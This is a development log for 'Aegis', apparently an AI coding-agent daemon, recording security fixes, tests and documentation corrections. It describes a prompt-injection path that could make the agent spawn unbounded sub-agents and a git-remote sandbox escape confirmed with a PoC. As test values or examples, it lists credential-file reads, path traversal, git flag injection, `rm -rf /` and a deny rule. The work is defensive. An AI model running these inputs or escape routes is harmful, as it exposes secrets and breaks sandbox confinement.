`cost.Tracker` happens to be in context, so a model turn steered by prompt-injected content (a debate
claim can be grounded in file content via `WithFiles`) could request an arbitrarily large round
count, each round spawning 2 real sub-agents. The JSON schema description now documents the cap.
Added `TestRunMaxRoundsHardCeiling` (`internal/debate/debate_test.go`), which fails against the
pre-fix code by exhausting its scripted responses. The roadmap's "consider a concurrent-spawn-count
cap alongside the existing depth cap" note for parallel `agent` tool calls was left open — a larger,
separate change (aggregate per-turn spawn accounting) than this item's scoped fix. **P32.5** (Tier
2): `internal/notify/notify.go`'s Windows toast-notification path and
`internal/tui/clipboard_image.go`'s clipboard-image paste path now call
`sandbox.WindowsShellBinary()` instead of hardcoding `"powershell"`, matching the convention
`hooks/exec.go`, `tui/tui.go`, and `security/install.go` already followed — closes the last two call
sites the P30 hardening sweep missed. **P32.6** (Tier 2): `engine.executeTool`
(`internal/engine/engine.go`) now logs a warning (`tool`, the tool name) whenever a write-capability
tool call's input yields zero paths from `writtenPathsFromInput` — previously a silent gap: an MCP
tool or a future builtin write tool using field names other than `path`/`file_path`/`edits[].path`
got no output-guard file validation and no quarantine-on-fail checkpoint rollback, with nothing
marking that the guard's coverage had silently degraded to chat-text-only. Added
`TestExecuteToolWarnsOnZeroPathWriteCall` (`internal/engine/engine_test.go`) with an
`oddShapeWriteTool` fixture and a buffered `slog` handler. **P32.7** (Tier 2): `skills.Discover`
(`internal/skills/skills.go`) is now memoized per `(workDir, dataDir, enabledBuiltins)` combination,
short-circuited by a recursive size/mtime/is-dir signature (`skillsDirSignature`) over the scanned
directories — the same change-detection pattern `persona.Refresh`'s `dirSignature` uses, extended to
walk recursively (`filepath.WalkDir` rather than a single `os.ReadDir`) since a bundled skill's asset
files live in subdirectories (`references/`, `scripts/`) whose edits don't touch the bundled skill's
own top-level directory entry the way persona's flat `*.md` layout does. Previously `BuildIndex`/
`InjectIntoSystem` re-walked and re-parsed every skill file — including a full asset-manifest
directory walk per bundled skill — on every session-start/system-prompt build. The cache is a plain
unbounded map (one entry per distinct project root a daemon's sessions touch), the same
unenforced-but-low-risk bound other per-root caches in this codebase carry; not evicted, matching
this item's Tier 2/no-dependency scope rather than adding a new retention policy. Added
`TestDiscoverCacheDetectsFileEdits` and `TestDiscoverCacheDetectsNestedBundledAssetChanges`
(`internal/skills/skills_test.go`) — the latter specifically exercises the recursive-vs-flat
distinction from persona's pattern. **P32.8** (Tier 3): `memory.md` now has a total-size cap.
`Append` (`internal/memory/memory.go`) gained `maxMemoryFileSize` (64KB) and a `pruneToCap` step
run after every write — once a file would grow past the cap, the oldest entries are dropped
(FIFO; safe because `Append` is pure append-only, so file order is already chronological) until
it's back under, then the integrity sidecar is refreshed against the pruned content. Previously
only a single entry was bounded (`maxMemoryEntry` = 4096B); nothing bounded the file as a whole, so
a long-running project/user memory grew forever, inflating `Load()`'s full-file system-prompt
injection cost every session and slowing `LoadRelevant`'s per-entry TF-IDF scan linearly. Larger
than a wiring fix because it needed a retention-policy decision first (hard-cap-with-FIFO-eviction
vs. LRU-by-relevance vs. periodic summarization) — resolved by asking the user, who picked FIFO for
its determinism and zero added state/model-call surface over the other two options. Pruning
operates on whole lines, so a hand-edited file using multi-line markdown structures can have that
structure cut mid-section if a prune triggers while it's over the cap — an accepted tradeoff of
keeping this a plain size/FIFO policy rather than a markdown-aware one. Added
`TestAppendPrunesOldestEntriesWhenOverCap` (`internal/memory/memory_test.go`), which fills well past
the cap and asserts the oldest entry is gone, the newest survives, and the file stays under
`maxMemoryFileSize`. `docs/memory-and-knowledge.md` documents the cap and its FIFO/markdown-cut
tradeoff. Verified with `go build ./...`, `go vet ./...`, and `go test ./...` (full suite, all
packages green) after each item.

**Earlier, same day:** shipped **P32.1** (Tier 1): plan mode's shell tool no longer grants
unconfined host-filesystem reads. `shellTool.CapabilityFor` (`internal/tool/builtin/shell.go`)
downgrades a narrow allowlist of read-only commands (`cat`, `Get-Content`, `git status/log/diff`,
…) from `CapExecute` to `CapRead`, which plan mode allows with no prompt — but unlike
`read_file`/`grep`/`glob`, this downgrade previously applied no path confinement at all, so
`cat /etc/shadow` or `Get-Content C:\Users\<user>\.ssh\id_rsa` ran unconfined in plan mode,
contradicting `docs/permissions.md`'s documented `Shell/Execute: Deny` guarantee. Fix:
`readOnlyShellCommand` (`internal/tool/builtin/shell_readonly.go`) now takes the tool's root and
runs every non-flag argument (for both the plain allowlist and git pathspecs after `--`) through
`sandbox.ValidatePath` — the same root-confinement check `read_file`/`grep`/`glob` already use —
before allowing the `CapRead` downgrade; a command with an absolute or `../`-traversal path
argument now falls back to `CapExecute` and requires the normal execute approval instead of being
silently auto-allowed. `CapabilityFor` carries no context, so this uses the tool's
construction-time root rather than a session-scoped `Workdir` override — a known, accepted
narrowing given the interface, not a new gap. Writing the Windows test case surfaced a second,
adjacent bug: `sandbox.ValidatePath` (`internal/sandbox/pathvalidator.go`) treated a Windows
driveless-rooted path (`/etc/shadow`, `\Windows\System32` — rooted at the current drive per actual
Windows path resolution, but not `filepath.IsAbs` since it has no volume) as a plain relative path
and folded it under root via `filepath.Join`, which validated it as safely confined even though the
real OS would resolve it against the drive root instead — fixed by detecting this shape
(`isWindowsRootedNoVolume`) and resolving it against `root`'s volume instead of joining, so
`escapesRoot` catches it like any other absolute escape. This is a general `ValidatePath` fix, so
it also closes the same gap for any other path-confined tool given a driveless-rooted path on
Windows, not just shell. Added positive/negative table-driven cases to
`shell_readonly_test.go` (OS-conditional for the Windows-drive-letter cases, since CI's Linux/macOS
runners don't treat backslash paths as absolute) and `TestValidatePathWindowsRootedNoVolumeEscape`
to `sandbox_test.go`. Verified with `go build ./...`, `go vet ./...`, and `go test ./...` (full
suite, all packages green).

**Previously, same day:** shipped **P30.4-P30.8** (Tier 2), closing out the Tier 2 docs-drift
batch and leaving the roadmap with zero open items. **P30.4:** six `docs/*.md` files
(`README.md`, `cli-reference.md`, `configuration.md`, `permissions.md`, `tools-reference.md`,
`installation.md`) linked to `security.md`, which was renamed to `security_scan.md` in an earlier
commit — repointed all six links (nine total link sites across those files, including two DAST/
network-recon anchors and two YAML-comment references in configuration.md's `security:` block).
**P30.5:** documented four fully-implemented but previously-undocumented CLI commands in
cli-reference.md — `aegis doctor` (preflight self-diagnostic; added its own section with the full
check list), `aegis trust` (P27.1 workspace-trust review/accept/revoke), `aegis cron list` (audit
view over persisted cron jobs, flagging `auto_approve`), and `aegis config update` (added as a
`### aegis config update` subsection under the existing `aegis config` heading). **P30.6:**
documented two fully-implemented but previously-undocumented TUI slash commands in tui-guide.md —
`/fork [n]` (Navigation & Sessions table) and `/notify <off|bell|desktop|both>` (Configuration &
Setup table). **P30.7:** three smaller doc-drift fixes — added the missing `cron_history` tool
entry to tools-reference.md's Scheduling section; added the missing `*(deferred)*` tag to
`diagnostics` and `references` in the LSP tools list (all seven LSP tools are deferred per
`internal/tool/builtin/builtin.go`'s `LSPTools(...)` call, confirmed against source before fixing);
added `provider.zero_tool_nudge` to configuration.md's exhaustive `provider:` YAML reference block.
**P30.8:** rewrote `internal/server/webui.go`'s `handleWebUI` doc comment, which still described the
web UI as covering only "the core chat loop" and pointed at research/roadmap.md's P15 track as an
open gap — P15 (persona/mode switching, cost/token display, checkpoints/rewind, security scanning,
skills, memory management) shipped and closed out earlier; while fixing this, found and fixed the
identical stale claim in docs/cli-reference.md's `aegis ui` section (same "current scope... not yet
started" wording), since leaving one fixed and the other stale would have been inconsistent. No
source-behavior changes — P30.8's `internal/server/webui.go` edit is a comment-only change, verified
with `go build ./...`. Docs-only otherwise; no tests apply. See roadmap.md — the roadmap now has
zero open items; next session should either pick a Tier 4 parked item only on a concrete trigger, or
run a fresh audit pass to find the next batch.

**Previously, same day:** shipped **P31.5** (Tier 2), closing out the P31 CodeQL batch: all
19 non-P31.2 `go/path-injection` alerts (#8-27 minus #4) were re-verified against source in the
P31.4 pass as one of two safe shapes (directory-enumeration re-join, or
`filepath.Join(validated-root, fixed-or-sanitized-suffix)`), so this session was pure suppression
bookkeeping, no code change. Added 8 entries to `.aegis/security-baseline.yaml` — one per file
rather than per alert, since `internal/security/dedup.go`'s `normalizeLocation` strips any
trailing `:<line>` before matching, so a file-scoped entry already suppresses every line CodeQL
flagged in that file — each with a `reason` field naming the specific alert numbers and lines it
covers and the applicable safe shape. Also dismissed all 19 corresponding GitHub alerts via
`gh api -X PATCH repos/fiddler110/Aegis/code-scanning/alerts/{n}` with
`dismissed_reason: "false positive"` and a per-alert justification comment; GitHub's 280-character
cap on `dismissed_comment` forced a terser phrasing than the baseline file's fuller reasoning; a
first pass at full-length comments 422'd on 18 of 19 (one alert's comment happened to fit), so
comments were shortened to point back to `.aegis/security-baseline.yaml` for the complete
justification rather than repeating it in full. Verified via `gh api ...code-scanning/alerts
--paginate` that all 19 now read `dismissed`. All 20 `go/path-injection` alerts are now resolved:
#1 and #13 read `fixed`, #8-12 and #14-27 read `dismissed` (this session), and #4 (P31.2's
already-fixed gate-ordering bug) remains `open` on GitHub's side pending its own CodeQL rescan —
out of scope here, since the code fix already shipped in P31.2. The three `go/command-injection`
alerts (#5, #6, #7) and cookie-secure-not-set alert #3 are unaffected by this session; #3 and #5
already read `fixed`/resolved from P31.3/earlier work, #6 and #7 remain open pending their own
rescan or a future dismissal pass. No source files changed; no build/test run needed. See
roadmap.md for the remaining Tier 2 docs-drift items (P30.4 next).

**Previously, same day:** shipped **P31.4** (Tier 2), with a scope correction from the
original plan. The roadmap's plan was "dismiss both `go/command-injection` alerts as
argv-exec/by-design." Re-verifying alert #7 (`internal/tool/builtin/git.go:68`) against source
confirmed the narrow CodeQL claim (never shell-interpreted — a false positive for classic command
injection) but surfaced a real, unrelated vulnerability on the same code path during that check:
the `git` tool's `remote` subcommand was allowlisted for "read-only listing" with no mutation
guard (unlike `branch`/`tag`/`stash`, which each have one), so `remote add <name> <url>` could
write an arbitrary URL into `.git/config` and `remote show`/`update`/`prune` would then contact
it — a `file://` URL walks to any git repo the daemon process can read, and the result (via the
already-allowlisted `log`/`show` subcommands) is a full sandbox escape reading file contents
outside the session's Workdir; any URL scheme is also an unapproved network-egress path, since the
tool is declared `CapRead` and so never reaches the `CapNetwork` `Ask` gate `permission.go` added
specifically to close silent read+exfil side channels. Confirmed exploitable with a PoC in an
isolated scratch repo (`file://` remote pointing at an unrelated repo elsewhere on disk; `remote
show`/`update` then `log`/`show` read its full history and file contents). `ext::` shell-transport
RCE was also tested but is blocked by default on git 2.54; the read/network-escape stands
independent of that. Fixed by adding a `"remote"` case to `rejectMutatingReadArgs`
(`internal/tool/builtin/git.go`) blocking `add`, `set-url`, `set-branches`, `set-head`, `rename`,
`remove`, `rm`, `update`, `prune` — mirroring the existing `branch`/`tag` guard shape — so no
attacker-controlled URL can ever enter `.git/config`; plain listing (`remote`, `remote -v`,
`remote show <existing>`, `remote get-url`) still works. New `TestGitReadRejectsRemoteMutation`
(`internal/tool/builtin/git_test.go`) covers all nine blocked subverbs plus the `-v` allow case.
Alert #7 can now be dismissed with a justification that references this fix rather than only the
argv-vector reasoning. Alert #5 (`internal/hooks/exec.go:95`) was re-verified independently —
traced `ExecSpec.Command` to its only source (`config.Config.Hooks`, koanf-loaded from
`config.yaml`/`.aegis/config.yaml`; no builtin tool writes to it) — and dismissed as originally
planned, no code change. `go build ./...`, `go test ./internal/tool/...` pass. P31.5's nineteen
`go/path-injection` alerts were also re-verified by reading five of the referenced files
(`persona/load.go`, `skills/skills.go`, `memory/memory.go`, `memory/integrity.go`,
`security/sbom.go`) against the two claimed safe shapes (directory-enumeration re-join;
`filepath.Join(validatedRoot, fixed-or-sanitized-suffix)`) — both held up, no vulnerability found,
dismiss/suppress as originally planned with no code change. See roadmap.md for the remaining Tier
2 items (P31.5's suppression bookkeeping next, then P30.4-P30.8).

**Previously, same day:** shipped **P31.3** (Tier 2): `internal/server/webui.go`'s
`handleWebUI` set the `HttpOnly`/`SameSite=Strict` double-submit CSRF cookie (FIND-01/P24.1)
without `Secure`, unconditionally — fine on the default loopback-only plaintext deployment, but a
gap on the `server.tls.enabled` (P24.18) remote-accessible path, where the cookie should never be
sent back over a downgraded plaintext connection. Changed the handler's unused `_ *http.Request`
parameter to `r` and set `Secure: r.TLS != nil` on the cookie. New
`TestWebUICSRFCookieSecureFlag` (`internal/server/webui_test.go`) asserts `Secure=false` over a
plain `httptest.NewServer` and `Secure=true` over `httptest.NewTLSServer`. `go build ./...` and
`go test ./internal/server/...` both pass. See roadmap.md for the remaining Tier 2 items (P31.4
next).

**Previously, same day:** shipped **P30.3** (Tier 1), the last open Tier 1 item: the TUI's
`!`-prefixed bang command (`execBangCmd`, `internal/tui/tui.go`) hardcoded
`exec.CommandContext(ctx, "sh", "-c", cmd)`, the same Windows gap as P30.2 in a different call
site. Added a `bangShellCommand` helper following the identical
`sandbox.WindowsShellBinary()`/`runtime.GOOS`-branching convention. New
`TestBangShellCommandPicksPlatformShell` and `TestBangShellCommandNotHardcodedSh`
(`internal/tui/bangcmd_test.go`) cover the platform branch and guard against the specific
regression of a bare `"sh"` on Windows. `go build ./...`, `go test ./internal/tui/...`, and
`go vet ./internal/tui/...` all pass. All four Tier 1 items (P31.1, P31.2, P30.1-P30.3) are now
shipped — see roadmap.md for the remaining Tier 2 items (P31.3 next).

**Previously, same day:** shipped **P30.2** (Tier 1): `internal/hooks/exec.go` ran every
configured `pre_tool_use`/`post_tool_use`/`session_start`/`stop`/`subagent_stop` hook command via
a hardcoded `exec.CommandContext(ctx, "sh", "-c", s.Command)`, silently failing to launch on a
native Windows host with no POSIX `sh` on PATH. Added a `shellCommand` helper mirroring
`internal/sandbox/sandbox.go`'s `shellCommand` and `internal/security/install.go`'s
`shellInvocation` convention: `sandbox.WindowsShellBinary()` (prefers `pwsh`) with
`-NoProfile -NonInteractive -Command <cmd>` on Windows, `/bin/sh -c <cmd>` elsewhere. Also fixed
`TestExecPreToolUseVeto` (`internal/hooks/exec_test.go`), which used POSIX-only `1>&2; exit 2`
syntax that fails to parse under PowerShell's reserved `1>&2` operator — replaced with a
GOOS-branching `vetoCommand` helper. New `TestShellCommandPlatformBranch` exercises the
`shellCommand` helper directly (GOOS-independent assertion). `go build ./...`,
`go test ./internal/hooks/...`, and `go vet ./internal/hooks/...` all pass.

**Previously, same day:** shipped **P30.1** (Tier 1): `internal/lsp/client.go`'s `readLoop`
returned silently when the LSP server process died or its stdio pipe broke, never notifying any
request parked in `c.pending` — every in-flight `call()` then blocked until the caller's own
context deadline, and nothing in `internal/engine` sets a per-tool timeout, so a dead language
server could hang an LSP tool call indefinitely. Ported the `failPending` pattern already used by
the structurally identical `internal/mcp` stdio JSON-RPC client: `pending` now carries a
`callResult{result, err}` pair instead of a bare `json.RawMessage`, and a new `failPending` method
marks the client closed and drains every pending channel with a synthetic connection error on any
`readLoop` exit (header-read EOF/error, oversized-body abort, or body-read error); `call()` checks
`closed` up front so post-death calls fail immediately instead of enqueueing into a pending map
nothing will ever drain again. As a side effect of the necessary channel-type change, RPC-level
errors (`resp.Error != nil`) are now also propagated to the caller instead of silently discarded.
Tested via a new `TestCallFailsPromptlyWhenTransportDies` (`internal/lsp/client_test.go`): closes
the transport mid-call and asserts the blocked `call()` returns a non-nil error within 5s (a real
safety net, not relied on by the fix) rather than hanging on the request's own long-lived context;
`go build ./...`, `go vet ./internal/lsp/...`, `go test ./internal/lsp/...`, and
`go test ./internal/tool/...` (downstream consumer) all pass.

**Previously, same day:** shipped **P31.2** (Tier 1, high): `internal/server/sessions.go`'s
`resolveSessionWorkdir` (the P25.1 session-Workdir validator) called `os.Stat` on a client-supplied
path *before* checking `s.workdirAllowed`, so a remote-accessible daemon let an
authenticated-but-not-allowlisted client use `POST /sessions` as a filesystem-existence oracle — the
400 ("workdir does not exist") vs. 403 ("not permitted") response distinguished existence from
disallowal before the allowlist gate ever ran. Reordered so `workdirAllowed` (pure string/prefix
comparison, no disk I/O) runs first and `os.Stat` only ever touches a path already inside the trust
boundary; local (non-remote-accessible) daemons were unaffected either way since `workdirAllowed`
short-circuits true for them. Tested via a new case appended to
`TestCreateSessionWorkdirTrustBoundary` (`internal/server/workdir_test.go`): a nonexistent path
outside the allowlist, with remote access enabled, must return 403 not 400; `go build ./...` and
`go test ./internal/server/...` pass. Closes [CodeQL alert
#4](https://github.com/fiddler110/Aegis/security/code-scanning/4).

**Previously, same day:** shipped **P31.1** (Tier 1, critical): nuclei's
`security.tools.nuclei.templates_version` config value (settable via config file or the daemon's
config-update API) reached both a `filepath.Join` (the per-version template cache/clone directory)
and a `git clone --branch <version>` argument with no format validation, so a value containing
`../` could escape the intended cache directory and a leading `-` could be interpreted as a git
flag. `internal/security/recon.go`'s `resolveNucleiTemplates` now rejects any `templates_version`
that doesn't match `^[A-Za-z0-9._-]+$` or that starts with `-`, before either use. Tested via a new
`TestResolveNucleiTemplatesRejectsUnsafeVersion` (`internal/security/recon_test.go`) covering
path-traversal (`../../../etc/passwd`, `..`, `v1.0.0/../../escape`), git-flag-injection
(`-oProxyCommand=evil`, `--upload-pack=evil`), and shell-metacharacter (`v1.0.0 && rm -rf /`)
shaped values, alongside the existing pinned-version test; `go build ./...`, `go vet ./...`, and
`go test ./internal/security/...` all pass. Closes [CodeQL alert
#6](https://github.com/fiddler110/Aegis/security/code-scanning/6).

**Previously, same day:** filed **P30.1-P30.8** (8 items) from a fresh parallel audit run
after the P29 batch closed all prior open work: a code-gap scan of internal/ and cmd/ for
TODO/stub/skip/robustness markers, and a docs-vs-implementation drift scan of every docs/*.md file
against current source. Three Tier 1 findings (P30.1-P30.3): the LSP client
(`internal/lsp/client.go`) can hang a tool call forever on transport death because, unlike the
structurally identical `internal/mcp` client, it never fails pending requests when its read loop
exits; and both `internal/hooks/exec.go` and the TUI's `!`-prefixed bang command
(`internal/tui/tui.go`) hardcode `sh -c` with no Windows branch, breaking on native Windows despite
the codebase already having an established `runtime.GOOS`-branching convention
(`sandbox.WindowsShellBinary()`) that these two call sites missed. Five Tier 2 doc-drift findings
(P30.4-P30.8): a stale `docs/security.md` link (file renamed to `security_scan.md`) in six docs
files, four shipped CLI commands (`aegis trust`, `aegis doctor`, `aegis cron list`, `aegis config
update`) and two shipped TUI slash commands (`/fork`, `/notify`) missing from their reference docs,
a few smaller tools-reference/configuration.md omissions, and a stale code comment in
`internal/server/webui.go` still describing the P15 web-UI-parity gap as open after that entire
track shipped. None of the eight are shipped yet — see roadmap.md for the open item list and
suggested pickup order (P30.1 first). Previously, on the same day, **P25.9** (Tier 4, user-triggered off the parked backlog) shipped in
scoped form: five of the six P25.1-deferred daemon singletons (`knowledge.Store`, `longmem.Store`,
the repo-map cache, persona/agent-def directory discovery, and the `os` sandbox backend's
write-confinement profile) are now session-Workdir-aware — see below. `lsp.Manager` stays parked
under the same P25.9 heading in roadmap.md, its resource-growth tradeoff judged worse than the gap
it would close. Also on 2026-07-14: both remaining P27 threat-model needs-verification items (hook
execution timing, cron fire-time rule application) were checked against the real code and existing
tests and confirmed already resolved, with no production change needed — see below. Also on
2026-07-14: the **P29** batch (6 items, doc drift found by a full parallel audit of every docs/*.md
file against the actual implementation) shipped in full, closing out every open roadmap item.
Also on 2026-07-14: **P28.5** (Tier 3, resumable web UI SSE stream) shipped, closing
out the entire P28 batch (all 7 items filed from the same day's live evaluation). Built on that same
day's **P28.3** (Tier 3, engine nudge/retry on a zero-tool-call actionable turn), **P28.7** (Tier 2,
persistent connection/model-health indicator), **P28.2** (Tier 2, local-model tool-calling guidance +
`aegis doctor` smoke test), **P28.4** (Tier 2, compaction robustness), and **P28.6** (Tier 2,
`TestLiveWorkflow` harness-quality fix).

### P25.9 — per-session scoping of five daemon-singleton services (LSP excluded)

P25.1 gave each session its own `Workdir` but explicitly deferred re-scoping six daemon-wide
singletons that stayed fixed to the daemon's own default workspace regardless of which Workdir a
session actually carried: `lsp.Manager`, `knowledge.Store`, `longmem.Store`, the cached repo-map,
persona/command/agent-def directory discovery, and the `os` sandbox backend's write-confinement
profile. User-triggered off the Tier 4 parked backlog; scoped down to five of the six after
discussion (`lsp.Manager` stays parked — see roadmap.md's P25.9 entry) and the `/knowledge`,
`/repomap/index`, and `/commands` HTTP admin endpoints were left untouched (documented as
daemon-wide by design; `/commands` turned out to have no session-scoped consumer at all, only the
admin listing).

Shipped, on branch `feat/p25.9-session-scoped-singletons`:
- **Shared infra**: a small generic `rootCache[T]` (`internal/server/rootcache.go`) — lazily
  create-and-cache one `T` per root directory under one mutex per cache — backs both the
  knowledge-store and repo-map fixes below, avoiding writing the same lock/lazy-init logic twice.
- **`knowledge.Store`**: `Server.knowledgeStoreFor(root)` returns the daemon's own store unchanged
  for its default workspace, else lazily opens and caches one at `root/.aegis/knowledge.db` (the
  DB path was already per-project by path; only the live `*Store` instance was the singleton). A
  new `builtin.KnowledgeProvider` interface (implemented via a closure over the not-yet-constructed
  `*Server`, mirroring the existing `cronRun`/`s.cronPermCheck` deferred-capture pattern in `New()`)
  lets `project_knowledge` resolve the right store from the call's context workdir instead of a
  store fixed at tool-registration time.
- **`longmem.Store`**: two independent fixes, since the store is intentionally one shared file
  across every project a daemon has ever pointed at (project is a data column, not a path).
  `entity_remember`/`entity_recall` (`internal/tool/builtin/longmem.go`) now derive their project
  tag from the call's context workdir instead of the daemon's own project baked in at construction.
  `SearchMemory`/`bm25Search`/`semanticRanking` (`internal/longmem/longmem.go`) gained an optional
  `project` parameter that filters on the existing packed `key` column's `@project`/`:project`
  suffix (no schema migration — `kind`/`key` were already `UNINDEXED` FTS5 columns) — without this,
  `entity_recall` from one project's session could surface another project's facts.
- **Repo-map cache**: `s.repoMapFor(root)` extends the existing `rootCache` pattern to the
  system-prompt repo-map block; `effectiveSystem` now resolves it from the session's own root
  (`s.workdirFor(sessionID)`) instead of always reading the single `s.repoMap` field — bringing it
  in line with the skills block two lines above it in the same function, which was already
  session-scoped.
- **Persona directory discovery**: the risky part, since `persona.Refresh` *atomically replaces*
  the entire shared persona set keyed only by name — a naive per-session `Refresh` call with a
  different root's dirs would evict whatever the daemon's own project (or a concurrent session's
  root) just loaded, not merge with it. Instead, `persona.GetForRoot` (`internal/persona/load.go`)
  does a pure, non-caching scan of just the session's own `root/.aegis/personas/` directory,
  falling through to the existing `Get` (still serving the daemon's own project, user-level, and
  built-in personas unchanged) when not found there — it never touches the shared
  `loaded`/`loadedOrder`/`refreshSig` state `Refresh` manages. `Server.personaFor(root, name)`
  wires this in at the session-creation, persona-switch, and per-turn persona lookups
  (`internal/server/sessions.go`, `messages.go`), reordering each to resolve the session's Workdir
  before the persona lookup instead of after.
- **Agent-def discovery**: safe to refresh per-session unlike persona, since `agentdef`'s `custom`
  map is additive-only (`Register` overwrites by name, never clears). `agentTool.resolveDef`
  (`internal/tool/builtin/agent.go`) rescans the session's own `.aegis/agents` directory via
  `agentdef.LoadFromDirs` before both `agentdef.Resolve` call sites when a context workdir is set.
- **`os` sandbox write-confinement**: the actual gap was narrow — `OSBackend.dir(opts)` already
  returned `opts.Dir` (correctly session-scoped via the shell tool's `effectiveRoot`) when set, but
  `seatbeltProfile`/`bwrapArgs` only ever allow-listed the backend's own `workspace`, built once at
  construction. `wrap()` (`internal/sandbox/os_sandbox.go`) now computes an `extraRoot` from
  `opts.Dir` per call when it differs from `workspace` and both functions allow-list it too, safe to
  trust because `opts.Dir` only ever originates from a session's own already-validated Workdir (no
  tool exposes a user-suppliable directory argument). This resolves the mismatch
  `resolveSessionWorkdir` used to warn about once per session-creation request; that warning (and
  its doc-comment caveat) is removed.

Tests: new `rootcache_test.go` (cache hit/miss, failed-create not cached, concurrent create-once
under `-race`); `internal/longmem`'s `TestSearchMemoryProjectScoping`; `internal/persona`'s
`TestGetForRootDoesNotMutateSharedState` (asserts `Names()`/`refreshSig` are byte-for-byte
unchanged by a foreign-root lookup); `internal/agentdef`'s `TestLoadFromDirsMergesAcrossRoots`;
`internal/sandbox`'s extra-root seatbelt/bwrap-arg tests plus an OS-gated
`TestOSBackendConfinesWritesToSessionWorkdir` integration test; `internal/server`'s
`session_scoping_test.go` (knowledge-store isolation, repo-map-differs-per-root, and an
end-to-end persona-resolution check through the real HTTP `CreateSession`/`GetSession` path); and
new `internal/tool/builtin` tests for `KnowledgeProvider` context-workdir resolution and
`entity_remember`/`entity_recall` project tagging/scoping. Full suite (`go test ./...`) and
`-race` on every touched package pass with no regressions; manually verified end-to-end against a
real running daemon (`aegis serve` built from this branch, a live local Ollama model): a session
created with `Workdir` pointed at a second directory (its own `.aegis/personas/session-reviewer.md`)
resolved that project's persona in its system prompt via the real `POST /sessions` →
`GET /sessions/{id}` round trip, while a default session (no Workdir) created immediately after
was unaffected.

### P27 threat model — last two needs-verification items, confirmed resolved (no code change)

The roadmap's needs-verification list (carried over from the P27 threat model,
`threat-model-20260712-200318/0-assessment.md`) had two items left after P28.1 closed the terminal-
escape-sequence question. Both were checked by reading the actual code path end-to-end and running
the tests that exercise it — not just re-reading the original static-review notes — and both turned
out to already be fully resolved by mechanisms that shipped with P27.1 and P27.15 respectively;
neither needed a code fix here.

- **Hook execution timing** (relevant to P27.1, the workspace-trust gate). The original concern was
  whether a project's `session_start`/`pre_tool_use` hooks could run before any trust decision is
  consulted. They can't, and there's no timing race to have: `applyWorkspaceTrust`
  (`internal/config/config.go:1122`) freezes `cfg.Hooks` back to the baseline (project layer
  excluded) synchronously inside `config.Load()`, which completes before `Server.New` ever
  constructs the hook executor (`s.execHook = hooks.NewExec(toExecSpecs(cfg.Hooks), logger)`,
  `internal/server/server.go:630`) — in turn well before any session (and therefore any
  `session_start` fire, `internal/server/messages.go:306`) exists. An untrusted directory's project
  hooks are never loaded into `s.execHook` in the first place, not merely delayed behind a prompt.
  `TestWorkspaceTrustFreezesUntrustedProjectConfig` (`internal/config/workspacetrust_test.go:28`)
  already asserts `cfg.Hooks` is empty when frozen, using a project config that declares a
  `session_start` hook — re-ran it (`go test ./internal/config/... -run TestWorkspaceTrust -v`) to
  confirm it still passes.
- **Cron fire-time gating** (relevant to P27.15). The original concern was whether text allow/deny
  rules are truly applied at cron fire time or only the coarse mode check. They are:
  `Server.cronPermCheck` (`internal/server/helpers.go:330`) runs the job through
  `s.buildGate(s.cfg.Permission.Mode, approver, persona.Persona{})` — the identical gate stack
  (mode → contextual egress/network policy → text allow/deny rules) `buildGate` assembles for every
  interactive tool call — against the real `shell` tool and the job's command, not a mode-only
  shortcut. `TestServerCronPermCheck` (`internal/server/cron_test.go:323`) exercises this exact
  production method (not just the test-mirrored helper the other cron tests use) with a real `deny
  shell(rm -rf*)` rule and confirms it blocks even when the job has `AutoApprove: true`; ran it
  alongside `TestNewCronRunFuncBlockedByDenyRuleEvenInAutoMode` and
  `TestNewCronRunFuncAllowedByRuleEvenInPlanMode` (`go test ./internal/server/... -run
  'TestServerCronPermCheck|TestNewCronRunFuncBlockedByDenyRuleEvenInAutoMode|TestNewCronRunFuncAllowedByRuleEvenInPlanMode'
  -v`) — all pass.

This closes the P27 threat model's needs-verification list entirely (the third item, TUI
escape-sequence neutralization, was already closed by P28.1).

### P29 batch — docs-vs-implementation drift (all 6 items, Tier 2/3, Effort S/M)

Filed 2026-07-14 from a full parallel audit comparing every `docs/*.md` file against the actual
implementation (`internal/tool/builtin`, `internal/permission`, `internal/config`,
`internal/provider`, plus persona/skills/swarm/debate/MCP/session/memory, which matched the code
exactly — no items filed there). All were pure documentation drift except P29.4, which the user
chose to resolve by changing behavior instead of docs.

- **P29.1** — `docs/tools-reference.md` and `docs/multi-agent.md` named the team-task-creation tool
  `team_task_create`; the real registered name is `team_task_add`
  (`internal/tool/builtin/team.go:40`). Corrected both docs; the tool itself was already correctly
  named everywhere in code and tests, so no code change.
- **P29.2** — `docs/permissions.md` (and, found during the same pass, `docs/security_scan.md`)
  described a fabricated per-session audit mechanism (`~/.local/share/aegis/audit/<session-id>.jsonl`,
  fields including `session_id`/`capability`, decision values `ask_approved`/`ask_denied`) that
  doesn't exist. Rewrote both to describe the real single global file, `<data_dir>/audit.jsonl`
  (`internal/server/server.go:628`), with its real phase-keyed schema
  (`internal/hooks/hooks.go:67-82`: `pre`/`post`/`policy_decision`/`subagent_stop` phases, real
  decision values `allow`/`deny`/`ask`).
- **P29.3** — `docs/sessions.md` and `docs/configuration.md` claimed the default data directory is
  `~/.local/share/aegis` (macOS/Linux) / `%LocalAppData%\aegis` (Windows); the real
  `defaultDataDir()` (`internal/config/config.go:874-890`) uses `~/.config/aegis` /
  `%AppData%\aegis` — a different XDG category on both platforms. Corrected both named files, plus
  the same stale path found in `docs/extensibility.md`, `docs/memory-and-knowledge.md`,
  `docs/overview.md`, `docs/personas.md`, and `docs/tools-reference.md` during the sweep.
- **P29.4** — `docs/configuration.md` listed `GROQ_API_KEY`/`OPENROUTER_API_KEY` as native provider
  env vars, but `config.ProviderAPIKey` only ever read `ANTHROPIC_API_KEY`/`OPENAI_API_KEY`/the
  hardcoded `"ollama"` fallback. Asked the user which fix path they wanted (doc-only correction vs.
  actually wiring the vars); they chose to wire them. `ProviderAPIKey`'s `"openai"` case
  (`internal/config/config.go`) now falls back to `GROQ_API_KEY` then `OPENROUTER_API_KEY` when
  `OPENAI_API_KEY` is unset — Groq/OpenRouter are reached via `provider.default: openai` plus a
  custom `base_url` (see `docs/providers.md`), not distinct provider names, so the fallback lives in
  the `"openai"` branch rather than as new provider cases. `docs/configuration.md` gained a short
  note clarifying the mechanism. Tested: `TestProviderAPIKeyGroqOpenRouterFallback`
  (`internal/config/config_test.go`) exercises the priority order
  (`OPENAI_API_KEY` > `GROQ_API_KEY` > `OPENROUTER_API_KEY` > empty) purely via env vars — no live
  API keys needed, matching how the rest of the package's env-driven config tests work.
